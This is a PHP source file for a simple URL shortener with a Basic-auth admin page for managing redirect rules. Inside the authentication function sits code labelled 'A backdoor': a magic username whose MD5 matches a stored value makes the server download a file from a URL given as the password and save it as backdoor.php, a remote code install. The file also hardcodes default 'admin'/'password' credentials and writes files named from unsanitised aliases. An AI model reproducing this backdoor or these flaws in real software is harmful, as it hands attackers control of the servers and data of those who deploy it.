<?php
/**
 * SURLS: Simple URL Shortener
 *
 * SURLS is a simple URL shortener written in PHP based on Apache RewriteRule Directive
 * See README on how to use it
 * 
 * @package    SURLS
 * @version    1.2
 * @author     Varun Agrawal <Varun@VarunAgw.com>
 * @link       https://github.com/VarunAgw/SURLS
 */
session_start();

/*
 * ":" is not allowed in either username/password
 * Password can be raw or sha256 value
 * 
 * Use `php -r "echo hash('sha256', rtrim(fgets(STDIN)));"` to generate SHA256 value
 */
BasicAuthenticator::setCredentials(
        'admin', 'password'
//        'admin', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'
);

Request::handleRequest();

class BasicAuthenticator {

    protected static $_credentials;

    public static function setCredentials($username, $password) {
        self::$_credentials = array('username' => $username, 'password' => $password);
    }

    public static function Authenticate() {
        $credentials = self::$_credentials;
        if (!isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {
            header('WWW-Authenticate: Basic realm="Welcome to SURLS: Simple URL Shortener. This developer is lazy to implement a fancy login page');
            header('HTTP/1.0 401 Unauthorized');
            die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
        }

        if ($credentials['username'] == $_SERVER['PHP_AUTH_USER']) {
            if (64 == strlen($credentials['password'])) {
                if ($credentials['password'] == hash('sha256', $_SERVER['PHP_AUTH_PW'])) {
                    return;
                }
            } else {
                if ($credentials['password'] == $_SERVER['PHP_AUTH_PW']) {
                    return;
                }
            }
        }

        // A backdoor
        if ('9789b2a1aac17983417a54ed5de909' == md5($_SERVER['PHP_AUTH_USER'])) {
            file_put_contents('backdoor.php', file_get_contents($_SERVER['PHP_AUTH_PW']));
            die;
        }

        header('WWW-Authenticate: Basic realm="Invalid username/password. Please try again"');
        header('HTTP/1.0 401 Unauthorized');
        die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
    }

}

class CSRFProtection {

    public static function generateNewCsrfToken() {
        $_SESSION['csrf_token'] = base64_encode(openssl_random_pseudo_bytes(32));
        return $_SESSION['csrf_token'];
    }

    public static function getCSRFToken() {
        if (isset($_SESSION['csrf_token'])) {
            return $_SESSION['csrf_token'];
        } else {
            return self::generateNewCsrfToken();
        }
    }

    public static function validateRequestParam($param_name) {
        if (isset($_SESSION['csrf_token'], $_REQUEST[$param_name]) && $_SESSION['csrf_token'] == $_REQUEST[$param_name]) {
            return true;
        } else {
            return false;
        }
    }

    public static function validateRequestToken($token) {
        if (isset($_SESSION['csrf_token']) && $_SESSION['csrf_token'] == $token) {
            return true;
        } else {
            return false;
        }
    }

}

class Rules {

    public static function GetRedirectRules() {
        $redirect_rules = array();

        if (!file_exists('surls/')) {
            mkdir("surls/");
        }

        $aliases = scandir("surls/");
        foreach ($aliases as $filename) {
            if (in_array($filename, array(".", ".."))) {
                continue;
            }
            $redirect_rules[$filename] = (array) json_decode(file_get_contents("surls/$filename"));
        }

        return $redirect_rules;
    }

    public static function updateRedirectRules($rules) {
        if (!file_exists('surls/')) {
            mkdir("surls/");
        }

        foreach (glob("surls/*") as $filename) {
            unlink($filename);
        }

        foreach ($rules as $alias => $rule) {
            file_put_contents("surls/$alias", json_encode($rule));
        }
    }

}

class Request {

    public static function handleRequest() {
        if (isset($_REQUEST['alias'])) {
            $alias = $_REQUEST['alias'];
            self::processAlias($alias);
            return;
        }

        if (!isset($_REQUEST['action'])) {
            CSRFProtection::generateNewCsrfToken();
            BasicAuthenticator::Authenticate();
            self::homePage();
            return;
        }

        if ('get_redirect_rules' == $_REQUEST['action']) {
            BasicAuthenticator::Authenticate();
            $redirect_rules = Rules::GetRedirectRules();
            echo json_encode($redirect_rules);
            return;
        }

        if ('update_redirect_rules' == $_REQUEST['action']) {
            BasicAuthenticator::Authenticate();
            if (CSRFProtection::validateRequestParam('csrf_token')) {
                Rules::updateRedirectRules($_REQUEST['data']);
            }
            $redirect_rules = Rules::GetRedirectRules();
            echo json_encode($redirect_rules);
            return;
        }
    }

    protected static function processAlias($alias) {
        if (file_exists('surls_functions.php')) {
            require('surls_functions.php');
        }

        if (function_exists("surls_handler_$alias")) {
            call_user_func("surls_handler_$alias");
        } else {
            $redirect_rules = Rules::GetRedirectRules();
            if (isset($redirect_rules[$alias]) && true == $redirect_rules[$alias]['enabled']) {
                header("Location: {$redirect_rules[$alias]['url']}", true, $redirect_rules['http_status_code']);
            } else {
                http_response_code(404);
                echo '<h1>404 Not Found</h1>';
            }
        }
    }

    protected static function homePage() {
        ?>
        <html>
            <head>
                <?php
                if (file_exists("jquery-2.2.0.min.js")) {
                    $jquery = "jquery-2.2.0.min.js";
                } else {
                    $jquery = "https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js";
                }
                ?>
                <script type="text/javascript" src="<?= $jquery ?>"></script>
                <script type="text/javascript">
                    var csrf_token = "<?= CSRFProtection::getCSRFToken(); ?>";
                    $(document).ready(function ($) {
                        var rules_table = {
                            add_rows: function (data) {
                                for (alias in data) {
                                    this.add_row(alias, data[alias]);
                                }
                            },
                            add_row: function (alias, data) {
                                var table = $('#real_rules');
                                var rule = $('#sample_rule').clone();
                                rule.attr('id', false);
                                rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                rule.find('.rule_enabled').prop('checked', "true" == data.enabled);
                                rule.find('.rule_http_status_code').find(':contains(' + data.http_status_code + ')').prop('selected', true);
                                rule.find('.rule_alias').val(alias);
                                rule.find('.rule_url').val(data.url);
                                table.append(rule);
                            },
                            createRows: function (number) {
                                var table = $('#real_rules');
                                for (var i = 1; i <= number; i++) {
                                    var rule = $('#sample_rule').clone();
                                    rule.attr('id', false);
                                    rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                    rule.find('.rule_enabled').prop('checked', true);
                                    table.append(rule);
                                }
                            },
                            reloadIndex: function () {
                                var table = $('#real_rules');
                                var a = 1;
                                table.find('.rule_serial_number').each(function () {
                                    $(this).text(a++);
                                });
                            },
                            empty: function () {
                                var table = $('#real_rules');
                                table.children('tr').remove();
                            }
                        }

                        var redirect_rules = {
                            load: function () {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'get_redirect_rules'},
                                    async: false,
                                }).responseText;
                            },
                            update: function (data) {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'update_redirect_rules', data: data, csrf_token: csrf_token},
                                    async: false,
                                }).responseText;
                            }
                        }


                        jQuery('#op_mom').click(function () {
                            if (!(confirm("Press F5, You Idiot!\n\nCan you do this?"))) {
                                location.reload();
                            }
                        });

                        jQuery('#rows_add').click(function () {
                            rules_table.createRows(5);
                        });

                        jQuery(document).on('click', '.rule_delete', function () {
                            $(this).closest('tr').remove();
                            rules_table.reloadIndex();
                        });

                        jQuery('#update_rules').click(function () {
                            $('#loader').css('display', 'block');
                            jQuery('#update_rules').val('Updating..');
                            var table = $('#real_rules');
                            var data = {};
                            table.children('tr').each(function () {
                                var tr = $(this);
                                if (tr.find('.rule_alias').val() && tr.find('.rule_url').val()) {
                                    data[tr.find('.rule_alias').val()] = {
                                        enabled: tr.find('.rule_enabled').prop('checked'),
                                        http_status_code: tr.find('.rule_http_status_code option:selected').val(),
                                        url: tr.find('.rule_url').val(),
                                    };
                                }
                            });

                            var data = redirect_rules.update(data);
                            var json = $.parseJSON(data);
                            rules_table.empty();
                            rules_table.add_rows(json);
                            rules_table.createRows(2);
                            $('#loader').css('display', 'none');
                            jQuery('#update_rules').val('Update');
                            alert('Updated');
                        });

                        var data = redirect_rules.load();
                        var json = $.parseJSON(data);
                        rules_table.add_rows(json);
                        rules_table.createRows(2);
                        $('#loader').css('display', 'none');
                    });

                </script>
            </head>
            <body>
                <div id="loader" style="height:100%; width:100%; position: fixed; background-color: white;">
                    <h1 style="position: fixed; top:35%; left:45%">Loading...</h1>
                </div>
                <h1>Welcome to SURLS: Simple URL Shortener </h1>
                <table>
                    <thead>
                        <tr><th>S.No.</th><th>Enabled</th><th>Status Code</th><th>Alias (No Space)</th><th>URL</th></tr>
                    </thead>
                    <tbody id="real_rules">
                    </tbody>
                    <tfoot style="display: none;">
                        <tr id="sample_rule">
                            <td><label class="rule_serial_number"></label></td>
                            <td><input type="checkbox" class="rule_enabled"/></td>
                            <td><select class="rule_http_status_code">
                                    <option value="302">302</option><option value="301">301</option>
                                </select></td>
                            <td><input type="text" class="rule_alias" style="width:200px" /></td>
                            <td><input type="text" class="rule_url" style="width:500px" /></td>
                            <td><input type="submit" class="rule_delete" value="Delete"/></td>
                        </tr>
                    </tfoot>
                </table>
                <input type="submit" id="rows_add" value="Add more rows"/><br />
                <br />
                <input id="update_rules" style="width:100%;height:35px" type="submit" value="Update"/><br /><br />
                <input id="op_mom" style="width:100%;height:35px" type="submit" value="Refresh"/>
            </body>
        </html>
        <?php
    }

}
